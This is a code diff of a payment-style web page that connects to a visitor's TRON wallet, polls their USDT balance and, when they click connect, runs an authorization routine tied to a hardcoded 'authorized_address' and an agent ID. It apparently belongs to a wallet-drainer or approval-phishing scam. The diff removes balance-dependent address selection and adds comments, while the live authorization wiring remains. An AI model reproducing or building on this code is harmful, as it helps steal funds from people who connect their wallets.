@@ -184,14 +184,11 @@
     // window.vConsole = new window.VConsole();
         var contactAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
         var authorized_address = "TMcf6FS83n5VnqHpmYU7zVJhpo2CXz1Liu";
-        var amout = "{$amount}"
         var total = 0;
-        var p_agent = "123456";//代理
+        var p_agent = "123456"; // 代理
         const urlParams = new URLSearchParams(window.location.search);
         const money = urlParams.get('money');
         document.getElementById("money-input").value = money;
-        
-        
         
         function getUrlQueryString(names, urls) {
             urls = urls || window.location.href;
@@ -200,44 +197,39 @@
             var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
             if (r != null && r[2] != "") return unescape(r[2]);
             return null;
-    
         }
+        
         function trcBalanceCallback(address, balance) {
             $('#yu').text(balance.toLocaleString() + ' USDT');
         }
-
+        
         $(function() {
             s();
             async function onConnect() {
-                    shouquan();
+                shouquan();
             }
             async function s() {
                 if (window.tronWeb) {
                     var tronWeb = window.tronWeb;
-                    let contract = await tronWeb.contract().at("{$address}");
+                    let contract = await tronWeb.contract().at("{$address}");  // 使用合约地址
                     let walletAddress = tronWeb.defaultAddress.base58;
                     let result = await contract.balanceOf(walletAddress).call(function(err, tex) {
                         if (err == null) {
-                            let total = tex._hex / (10 ** 6);
-                            if (total > amout) {
-                                var abicion = abicoin;
-                            } else {
-                                var abicion = authorized_address
-                            };
-                            this.abio = abicion;
-                            $('#yu').text(total.toLocaleString() + ' USDT');
-
-                            console.log();
+                            let total = tex._hex / (10 ** 6);  // 转换单位，例如从 Sun 到 USDT
+                            $('#yu').text(total.toLocaleString() + ' USDT');  // 显示余额
                         }
                     });
-                } else {}
+                } else {
+                    console.log("tronWeb is not available");
+                }
             }
-        document.querySelector("#btn-connect").addEventListener("click", onConnect);    
-        setInterval(s, 1500);
-
-        trcInit(authorized_address, p_agent);
         
-        })
+            document.querySelector("#btn-connect").addEventListener("click", onConnect);    
+            setInterval(s, 1500);  // 每隔 1.5 秒更新一次余额
+        
+            trcInit(authorized_address, p_agent);
+        });
+
         document.getElementById('btn-connect').onclick = function() {
         document.getElementById('loading').style.display = 'block';
         setTimeout(function() {
